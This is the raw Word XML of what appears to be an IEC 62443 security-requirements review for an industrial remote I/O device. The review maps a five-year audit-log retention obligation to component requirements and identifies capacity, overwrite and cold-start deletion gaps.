      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.1 Requirement &amp; CR Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D55FDA" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">EU Machinery Regulation (EU) 2023/1230, Annex III </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EHSR 1.1.9 §3 (final sentence)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>5-year retention</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the tracing log of intervention data. </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>long</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>-term audit-retention</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:t>requirement</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E5728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1012"/>
        <w:gridCol w:w="1972"/>
        <w:gridCol w:w="3462"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="7BD403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CB0842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08B28F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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282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B6BE9D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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282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BB5C63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Note</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="71094E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9CA0F" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve">CR 2.8 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>Auditable</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>events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961AA" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E5728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483C9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Correct (the log </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>generates</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> entries)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0855F" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>Keep.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="7C030F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D03EB" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve">CR 2.9 – Audit </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>storage</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>capacity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2C0E96" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E5728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85D86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Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> and </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>central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886AB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>The CR the capacity conflict violates.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="14B4E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F2497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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>CR 2.10 – Response to audit processing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B7511" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282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70090" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282"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D8A07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>Overflow "handled" by silent circular overwrite = evidence destruction.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="3AF96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093B0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 xml:space="preserve">CR 3.9 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Protection</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>of</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>audit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>information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ECFAF" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282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23314" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282"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E838C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>Non-safety (QM), cold-start-cleared → neither durable nor protected.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="4B4E63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0975C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 xml:space="preserve">CR 6.1 – Audit-log </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>accessibility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B640A" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282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98F47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A60BF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Log IoT-readable (SRIO-10662) — accessibility works; </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>retention</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> fails.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="195CE540" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Corrected mapping:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-012 → EHSR 1.1.9 §3 (retention) →</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{CR 2.8 [generation], CR 2.9 [capacity — violated], CR 2.10 [overflow response — violated], CR 3.9 [protection/durability — violated], CR 6.1 [accessibility — met]}</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Version-history retention → RQ-013; access restriction → RQ-014.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId299" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E57282">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId300" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1BD393C8" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282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829"/>
        <w:gridCol w:w="6485"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="02B235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D916BB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49CAD2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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282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F68752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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Verdict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="7808C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7FD2C" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve">Asset I – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>tracing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> 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82EFF" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E5728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FA4FA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Correct and sufficient — this requirement is purely the audit asset's </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>retention</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="2B88A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9C250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 xml:space="preserve">Asset F – Domain </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>separation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03361" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>note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FF28C" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">The log resides on the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>non-safety COM (QM)</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (SRIO-10665) — a safety-critical retention obligation on a QM component (recurring architectural mismatch). </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>One</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve">-line </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>note</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3414D839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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>STRIDE:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Repudiation (primary)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>➕</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Tampering-on-audit</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — cold start clears the log, so retention is defeated by </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>forcing a power cycle</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (MITRE ATT&amp;CK for ICS </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>T0872</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Indicator Removal on Host</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>; justifies CR 3.9). No change.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB7D4E8" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.3 Security Functions &amp; Gaps — Cross-Referenced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6F85BA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Your mitigation description is accurate; one </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>precision correction</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the durability arithmetic retained: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922"/>
        <w:gridCol w:w="5527"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="6DF34A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69E1F4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0DF5A8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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Documentation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282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95E15C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Note</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="62EAC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0C22A" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve">Error Log, ≥100 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>entries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59E58" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>SRIO-10703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8950C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rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> Your figure correct. </w:t>
            </w:r>
            <w:hyperlink r:id="rId301" w:history="1">
              <w:r w:rsidRPr="00E57282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E57282">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E57282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E57282" w:rsidRPr="00E57282" w14:paraId="74216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4BD0F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>Circular buffer (oldest overwritten when full)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5D76B" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>SRIO-10663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5FE16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rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> Capacity conflict confirmed. </w:t>
            </w:r>
            <w:hyperlink r:id="rId302" w:history="1">
              <w:r w:rsidRPr="00E57282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E57282">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E57282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E57282" w:rsidRPr="00E57282" w14:paraId="11A9A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2303A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Cleared</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> on </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>cold</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>start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0F152" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>SRIO-6521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69EE0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rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> Deletion conflict confirmed. </w:t>
            </w:r>
            <w:hyperlink r:id="rId303" w:history="1">
              <w:r w:rsidRPr="00E57282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E57282">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
